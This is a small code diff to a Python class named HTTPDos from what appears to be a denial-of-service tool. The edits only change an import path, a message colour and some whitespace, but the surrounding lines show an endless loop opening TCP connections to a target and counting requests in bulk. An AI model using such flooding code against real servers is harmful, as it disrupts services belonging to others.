@@ -9,7 +9,7 @@ import string
 import time
 from threading import Thread
 from src.utils import color_text
-from src.dos.constants import TCP
+from src.config import TCP
 
 
 class HTTPDos():
@@ -40,8 +40,6 @@ class HTTPDos():
         time.sleep(1)
         color_text('yellow', '[+] Start sending')
 
-        
-
         if self.protocol == 'https':
             self.ssl_available = self.test_ssl_connection()
 
@@ -64,7 +62,7 @@ class HTTPDos():
         else:
             if self.protocol == 'https':  # if https failure, testing http
                 color_text(
-                    'green', f'[*] {self.target_ip} on port {self.target_port} is available sending request !')
+                    'blue', f'[*] {self.target_ip} on port {self.target_port} is available sending request !')
             while True:
                 sock = socket.socket(socket.AF_INET, TCP)
                 sock.connect((self.target_ip, self.target_port))
@@ -99,7 +97,7 @@ class HTTPDos():
     def count_requests(self):
 
         request_nb = next(self.counter)
-        
+
         if request_nb % 10_000 == 0:
             sys.stdout.write(f'{request_nb} request send !\r\n')
             sys.stdout.flush()
